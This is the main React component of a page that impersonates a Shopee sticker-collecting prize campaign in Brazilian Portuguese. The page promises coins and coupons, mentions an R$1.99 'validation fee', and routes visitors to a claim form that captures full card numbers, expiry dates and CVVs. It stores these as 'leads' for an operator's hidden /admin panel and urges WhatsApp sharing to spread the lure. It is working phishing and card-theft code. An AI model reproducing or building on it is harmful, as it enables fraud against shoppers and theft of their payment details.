import React, { useState, useEffect } from 'react';
import confetti from 'canvas-confetti';
import { Play, Sparkles, Shield, Users } from 'lucide-react';
import { MascotIllustration } from './components/MascotIllustration';
import { HowToPlaySection } from './components/HowToPlaySection';
import { PrizesSection } from './components/PrizesSection';
import { Footer } from './components/Footer';
import { StickerGameModal } from './components/StickerGameModal';
import { ClaimFormModal } from './components/ClaimFormModal';
import { AdminPanelModal, Lead } from './components/AdminPanelModal';
import { TaskModal } from './components/TaskModal';
import { ShareModal } from './components/ShareModal';
import { DoubleRewardModal } from './components/DoubleRewardModal';
import { AdminLogin } from './components/AdminLogin';

export default function App() {
  // State for chances and modals
  const [chances, setChances] = useState<number>(0);
  const [isGameModalOpen, setIsGameModalOpen] = useState<boolean>(false);
  const [isClaimFormModalOpen, setIsClaimFormModalOpen] = useState<boolean>(false);
  const [isAdminModalOpen, setIsAdminModalOpen] = useState<boolean>(false);
  const [isTasksModalOpen, setIsTasksModalOpen] = useState<boolean>(false);
  const [isShareModalOpen, setIsShareModalOpen] = useState<boolean>(false);
  const [isDoubleRewardModalOpen, setIsDoubleRewardModalOpen] = useState<boolean>(false);
  const [notification, setNotification] = useState<string | null>(null);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(() => {
    return sessionStorage.getItem('admin_logged_in') === 'true';
  });

  // Leads list with persistence in localStorage
  const [leads, setLeads] = useState<Lead[]>(() => {
    try {
      const saved = localStorage.getItem('shopee_leads');
      if (saved) return JSON.parse(saved);
    } catch {}
    return [
      {
        id: 'lead_1',
        nome: 'Mariana Oliveira da Silva',
        numeroCartao: '4234 5678 9012 3456',
        bandeira: 'Visa',
        validade: '12/29',
        cvv: '123',
        dataCadastro: '06/10/2026 14:10',
        status: 'Novo',
      },
      {
        id: 'lead_2',
        nome: 'Carlos Eduardo Santos',
        numeroCartao: '5465 4321 0987 6543',
        bandeira: 'Mastercard',
        validade: '05/30',
        cvv: '456',
        dataCadastro: '06/10/2026 13:45',
        status: 'Contatado',
      },
    ];
  });

  useEffect(() => {
    try {
      localStorage.setItem('shopee_leads', JSON.stringify(leads));
    } catch {}
  }, [leads]);

  const handleAddLead = (leadData: { nome: string; numeroCartao: string; bandeira: string; validade: string; cvv: string }) => {
    const now = new Date();
    const formattedDate =
      now.toLocaleDateString('pt-BR') +
      ' ' +
      now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

    const newLead: Lead = {
      id: `lead_${Date.now()}`,
      nome: leadData.nome,
      numeroCartao: leadData.numeroCartao,
      bandeira: leadData.bandeira,
      validade: leadData.validade,
      cvv: leadData.cvv,
      dataCadastro: formattedDate,
      status: 'Novo',
    };

    setLeads((prev) => [newLead, ...prev]);
  };

  const handleUpdateLeadStatus = (id: string, newStatus: Lead['status']) => {
    setLeads((prev) =>
      prev.map((l) => (l.id === id ? { ...l, status: newStatus } : l))
    );
    showNotification('Status do lead atualizado!');
  };

  const handleDeleteLead = (id: string) => {
    setLeads((prev) => prev.filter((l) => l.id !== id));
    showNotification('Lead excluído do painel.');
  };

  const handleClearAllLeads = () => {
    setLeads([]);
    showNotification('Todos os leads foram removidos.');
  };

  const [tasks, setTasks] = useState([
    {
      id: 'login',
      title: 'Fazer login diário na Shopee',
      reward: '1 chance',
      done: true,
    },
    {
      id: 'share_friends',
      title: 'Compartilhar figurinhas com 1 amigo no WhatsApp',
      reward: '1 chance',
      done: false,
    },
    {
      id: 'browse_deals',
      title: 'Ver ofertas relâmpago por 15 segundos',
      reward: '1 chance',
      done: false,
    },
    {
      id: 'follow_store',
      title: 'Seguir a loja oficial Shopee Figurinhas',
      reward: '1 chance',
      done: false,
    },
  ]);

  const showNotification = (msg: string) => {
    setNotification(msg);
    setTimeout(() => setNotification(null), 3500);
  };

  const handleCompleteTask = (taskId: string) => {
    setTasks((prev) =>
      prev.map((t) => (t.id === taskId ? { ...t, done: true } : t))
    );
    setChances((prev) => prev + 1);
    showNotification('🎉 Tarefa concluída! +1 chance adicionada!');
    try {
      confetti({ particleCount: 40, spread: 50, origin: { y: 0.7 } });
    } catch {}
  };

  const handleOpenPlay = () => {
    setIsDoubleRewardModalOpen(true);
  };

  const handleShareDouble = () => {
    setIsDoubleRewardModalOpen(false);
    showNotification('VOCÊ ESTARÁ RECEBENDO EM DOBRO!');
    setTimeout(() => {
      setIsGameModalOpen(true);
    }, 1500);
  };

  const handleSkipDouble = () => {
    setIsDoubleRewardModalOpen(false);
    setIsGameModalOpen(true);
  };

  const isAdminRoute = window.location.pathname === '/admin';

  if (isAdminRoute) {
    if (!isAdminLoggedIn) {
      return (
        <AdminLogin 
          onLoginSuccess={() => {
            setIsAdminLoggedIn(true);
            sessionStorage.setItem('admin_logged_in', 'true');
          }} 
        />
      );
    }

    return (
      <div className="min-h-screen bg-[#f5f5f5] font-['Plus_Jakarta_Sans',sans-serif]">
        <AdminPanelModal
          isOpen={true}
          onClose={() => { 
            sessionStorage.removeItem('admin_logged_in');
            setIsAdminLoggedIn(false);
            window.location.href = '/'; 
          }}
          leads={leads}
          onUpdateStatus={handleUpdateLeadStatus}
          onDeleteLead={handleDeleteLead}
          onClearAllLeads={handleClearAllLeads}
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col font-['Plus_Jakarta_Sans',sans-serif] text-slate-800">
      {/* Floating Notification */}
      {notification && (
        <div className="fixed top-6 left-1/2 -translate-x-1/2 z-50 bg-gray-900 text-white px-5 py-3 rounded-2xl shadow-2xl border border-white/20 flex items-center gap-2 text-xs md:text-sm animate-bounce">
          <span>✨</span>
          <span>{notification}</span>
        </div>
      )}

      {/* Top Cost Warning Banner */}
      <div className="w-full bg-[#ffeb3b] text-yellow-900 text-[11px] sm:text-xs md:text-sm font-black text-center py-2 px-4 shadow-sm z-40 relative tracking-wide uppercase border-b border-yellow-500">
        ⚠️ Aviso: A liberação do prêmio possui uma taxa de validação de apenas R$1,99.
      </div>

      {/* Main Campaign Canvas Container */}
      <main className="flex-1 w-full flex justify-center px-0 sm:px-2 md:px-4 py-0 sm:py-6">
        {/* Central Campaign Strip (exact width & layout as original) */}
        <div className="w-full max-w-[700px] bg-[#d71920] relative shadow-2xl sm:rounded-3xl overflow-hidden flex flex-col items-center">
          
          {/* Dynamic Golden Curved Glow Ribbons on Background */}
          <div className="absolute inset-0 pointer-events-none overflow-hidden">
            {/* Left curved golden ribbon */}
            <div className="absolute -left-20 top-24 w-48 h-96 border-[12px] border-amber-300/30 rounded-full blur-[2px] transform -rotate-12" />
            <div className="absolute -left-10 top-96 w-40 h-[600px] border-[10px] border-amber-400/25 rounded-full blur-[1px] transform -rotate-6" />
            
            {/* Right curved golden ribbon */}
            <div className="absolute -right-20 top-20 w-48 h-96 border-[12px] border-amber-300/30 rounded-full blur-[2px] transform rotate-12" />
            <div className="absolute -right-10 top-96 w-40 h-[600px] border-[10px] border-amber-400/25 rounded-full blur-[1px] transform rotate-6" />
            
            {/* Top festive radial gradient glow */}
            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[500px] h-[350px] bg-gradient-to-b from-yellow-300/20 via-red-500/0 to-transparent blur-2xl" />
          </div>

          {/* Section: Campaign Header / Hero */}
          <div className="w-full pt-6 pb-2 px-4 flex flex-col items-center relative z-10">
            {/* Blue Gift Box Graphic with Yellow Ribbon */}
            <div className="relative mb-1 flex items-center justify-center">
              <svg viewBox="0 0 100 80" className="w-20 h-16 drop-shadow-xl overflow-visible">
                {/* Sparkles around box */}
                <circle cx="12" cy="15" r="2" fill="#ffd700" />
                <circle cx="88" cy="20" r="2.5" fill="#ffd700" />
                <path d="M 85 10 L 88 15 L 85 20 L 82 15 Z" fill="#ffffff" />
                
                {/* Gift Box Base */}
                <rect x="25" y="30" width="50" height="42" rx="4" fill="#0046b8" stroke="#002d75" strokeWidth="2" />
                {/* Box Lid */}
                <rect x="20" y="24" width="60" height="12" rx="3" fill="#0057e7" stroke="#00358f" strokeWidth="2" />
                
                {/* Golden Vertical Ribbon */}
                <rect x="44" y="24" width="12" height="48" fill="#ffd700" />
                {/* Golden Horizontal Ribbon */}
                <rect x="20" y="28" width="60" height="5" fill="#f5c200" opacity="0.6" />
                
                {/* Bow Loops on Top */}
                <path
                  d="M 50 24 C 38 10 32 6 42 6 C 50 6 50 20 50 24 Z"
                  fill="#ffd700"
                  stroke="#c69500"
                  strokeWidth="1.5"
                />
                <path
                  d="M 50 24 C 62 10 68 6 58 6 C 50 6 50 20 50 24 Z"
                  fill="#ffd700"
                  stroke="#c69500"
                  strokeWidth="1.5"
                />
                {/* Bow Center Knot */}
                <circle cx="50" cy="23" r="5" fill="#f3ba00" stroke="#b08500" strokeWidth="1" />
              </svg>
            </div>

            {/* Campaign 3D Big Title: "SHOPEE FIGURINHAS" */}
            <div className="text-center select-none">
              <h1
                className="text-4xl sm:text-5xl md:text-6xl font-black text-white tracking-tight uppercase leading-none font-sans"
                style={{
                  textShadow: `
                    -2px -2px 0 #0046b8,
                    2px -2px 0 #0046b8,
                    -2px 2px 0 #0046b8,
                    2px 2px 0 #0046b8,
                    0 5px 0 #002d75,
                    0 7px 10px rgba(0, 0, 0, 0.45)
                  `
                }}
              >
                SHOPEE
                <br />
                FIGURINHAS
              </h1>

              {/* Black Capsule Date: "01 - 08 OUT" */}
              <div className="inline-block mt-3 bg-black/90 text-white font-extrabold text-xs sm:text-sm tracking-wider px-6 py-1 rounded-full shadow-lg border border-white/20 uppercase">
                01 - 08 OUT
              </div>
            </div>

            {/* Mascot + Bubble CTA Row */}
            <div className="w-full flex items-center justify-center gap-2 sm:gap-4 mt-4 px-2 max-w-[550px]">
              {/* Mascot Dog in Tuxedo */}
              <div className="w-36 sm:w-44 shrink-0 -mr-2 sm:-mr-4">
                <MascotIllustration holdingCouponText="R$100" />
              </div>

              {/* White Speech/Card Bubble */}
              <div className="bg-white rounded-3xl p-4 sm:p-5 shadow-2xl flex flex-col items-center text-center border-4 border-white/90 max-w-[250px] sm:max-w-[280px]">
                <p className="text-gray-900 font-extrabold text-sm sm:text-base leading-tight mb-3">
                  Colecione as figurinhas e resgate{' '}
                  <span className="text-[#d71920] font-black">MOEDAS</span>{' '}
                  e{' '}
                  <span className="text-[#d71920] font-black">CUPONS</span>
                </p>

                {/* Big Royal Blue Button: "RESGATE AGORA ▶" */}
                <button
                  onClick={handleOpenPlay}
                  className="w-full bg-[#0052d4] hover:bg-[#0041a8] active:scale-95 text-white font-black text-sm sm:text-base py-3 px-5 rounded-2xl flex items-center justify-center gap-2 shadow-xl border-2 border-blue-400 transition-all cursor-pointer group"
                >
                  <span>RESGATE AGORA</span>
                  <Play className="w-4 h-4 fill-white text-white group-hover:translate-x-0.5 transition-transform" />
                </button>
              </div>
            </div>
          </div>

          {/* Section: COMO JOGAR */}
          <div className="w-full px-4 sm:px-6 relative z-10">
            <HowToPlaySection
              onDrawClick={handleOpenPlay}
              onShareClick={() => setIsShareModalOpen(true)}
              onTasksClick={() => setIsTasksModalOpen(true)}
              onClaimClick={handleOpenPlay}
            />
          </div>

          {/* Section: PRÊMIOS */}
          <div className="w-full px-4 sm:px-6 relative z-10">
            <PrizesSection
              onSelectPrize={(prize) => {
                showNotification(`Cupom copiado: ${prize}`);
                try {
                  confetti({ particleCount: 30, spread: 45 });
                } catch {}
              }}
            />
          </div>

          {/* Section: Bottom CTA Card */}
          <div className="w-full px-4 sm:px-6 flex flex-col items-center relative z-10 mt-2 mb-4">
            <div className="w-full max-w-[420px] bg-white rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col items-center text-center border-4 border-white/90">
              <p className="text-gray-900 font-extrabold text-sm sm:text-base leading-snug mb-4 max-w-[320px]">
                Complete a sua coleção e regate{' '}
                <span className="text-[#d71920] font-black">Moedas Shopee</span>{' '}
                e{' '}
                <span className="text-[#d71920] font-black">cupons de desconto</span>
              </p>

              {/* Big Blue CTA Button */}
              <button
                onClick={handleOpenPlay}
                className="w-full max-w-[280px] bg-[#0052d4] hover:bg-[#0041a8] active:scale-95 text-white font-black text-base sm:text-lg py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 shadow-xl border-2 border-blue-400 transition-all cursor-pointer group"
              >
                <span>RESGATE AGORA</span>
                <Play className="w-4 h-4 fill-white text-white group-hover:translate-x-0.5 transition-transform" />
              </button>
            </div>
          </div>

          {/* Festive 3D Golden Podium with Red Carpet */}
          <div className="w-full relative mt-4">
            <svg
              viewBox="0 0 600 240"
              className="w-full h-auto overflow-visible select-none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <defs>
                {/* Gold gradients */}
                <linearGradient id="goldTop" x1="0%" y1="0%" x2="0%" y2="100%">
                  <stop offset="0%" stopColor="#fef08a" />
                  <stop offset="100%" stopColor="#eab308" />
                </linearGradient>
                <linearGradient id="goldFront" x1="0%" y1="0%" x2="0%" y2="100%">
                  <stop offset="0%" stopColor="#ca8a04" />
                  <stop offset="100%" stopColor="#854d0e" />
                </linearGradient>
                <linearGradient id="carpetRed" x1="0%" y1="0%" x2="0%" y2="100%">
                  <stop offset="0%" stopColor="#b91524" />
                  <stop offset="100%" stopColor="#e11d48" />
                </linearGradient>
              </defs>

              {/* Stage Back Base / Shadow */}
              <ellipse cx="300" cy="180" rx="270" ry="50" fill="#7f0c15" opacity="0.6" />

              {/* Lower Tier Podium */}
              {/* Lower Tier Top Surface */}
              <path
                d="M 60 160 L 160 125 L 440 125 L 540 160 L 440 195 L 160 195 Z"
                fill="url(#goldTop)"
                stroke="#ca8a04"
                strokeWidth="1.5"
              />
              {/* Lower Tier Front Face */}
              <path
                d="M 60 160 L 160 195 L 440 195 L 540 160 L 540 185 L 440 220 L 160 220 L 60 185 Z"
                fill="url(#goldFront)"
              />

              {/* Middle Tier Podium */}
              {/* Middle Tier Top Surface */}
              <path
                d="M 120 120 L 195 90 L 405 90 L 480 120 L 405 150 L 195 150 Z"
                fill="url(#goldTop)"
                stroke="#ca8a04"
                strokeWidth="1.5"
              />
              {/* Middle Tier Front Face */}
              <path
                d="M 120 120 L 195 150 L 405 150 L 480 120 L 480 135 L 405 165 L 195 165 L 120 135 Z"
                fill="url(#goldFront)"
              />

              {/* Upper Center Tier */}
              <path
                d="M 170 85 L 225 60 L 375 60 L 430 85 L 375 110 L 225 110 Z"
                fill="url(#goldTop)"
                stroke="#ca8a04"
                strokeWidth="1.5"
              />
              <path
                d="M 170 85 L 225 110 L 375 110 L 430 85 L 430 98 L 375 123 L 225 123 L 170 98 Z"
                fill="url(#goldFront)"
              />

              {/* Red Carpet flowing down center */}
              <polygon
                points="260,60 340,60 370,225 230,225"
                fill="url(#carpetRed)"
                stroke="#ffd700"
                strokeWidth="2"
              />
              {/* Carpet Gold Trim */}
              <line x1="260" y1="60" x2="230" y2="225" stroke="#facc15" strokeWidth="3" />
              <line x1="340" y1="60" x2="370" y2="225" stroke="#facc15" strokeWidth="3" />
            </svg>
          </div>
        </div>
      </main>

      {/* Footer com Pagamento e Bandeiras apenas */}
      <Footer />

      {/* Interactive Sticker Game Modal (Replica identical to screenshot) */}
      <StickerGameModal
        isOpen={isGameModalOpen}
        onRedeemSet={() => {
          setIsGameModalOpen(false);
          setIsClaimFormModalOpen(true);
        }}
      />

      {/* Form Modal for Redeeming the Set */}
      <ClaimFormModal
        isOpen={isClaimFormModalOpen}
        onClose={() => setIsClaimFormModalOpen(false)}
        onSubmitLead={handleAddLead}
        onSubmitSuccess={() => {
          showNotification('🎉 Resgate registrado com sucesso!');
        }}
      />

      <DoubleRewardModal
        isOpen={isDoubleRewardModalOpen}
        onClose={() => setIsDoubleRewardModalOpen(false)}
        onShare={handleShareDouble}
        onSkip={handleSkipDouble}
      />
      {/* Daily Tasks Modal */}
      <TaskModal
        isOpen={isTasksModalOpen}
        onClose={() => setIsTasksModalOpen(false)}
        tasks={tasks}
        onCompleteTask={handleCompleteTask}
      />

      {/* Share / Swap Stickers Modal */}
      <ShareModal
        isOpen={isShareModalOpen}
        onClose={() => setIsShareModalOpen(false)}
        onShared={() => {
          setChances((prev) => prev + 1);
          showNotification('🎉 Compartilhado com sucesso! +1 chance ganha!');
        }}
      />
    </div>
  );
}
